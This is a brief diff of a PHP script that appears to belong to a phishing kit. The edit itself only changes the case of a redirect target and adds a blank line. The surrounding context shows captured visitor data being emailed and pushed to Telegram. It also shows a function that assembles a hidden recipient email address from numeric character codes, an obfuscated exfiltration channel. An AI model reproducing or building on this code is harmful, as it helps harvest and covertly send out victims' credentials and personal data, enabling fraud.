@@ -17,7 +17,7 @@ $message .= "User-Agent: ".$browser."\n";
 $headers = "From: famoz";
 @mail($send,$subject,$message,$headers);
 send_telegram_msg($message);
-header("location:cancel.php");
+header("location:Cancel.php");
 function country_sort(){
   $sorter = "";
   $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
@@ -56,5 +56,6 @@ function visitor_country()
     return $result;
 }
 ?>
+
 
 
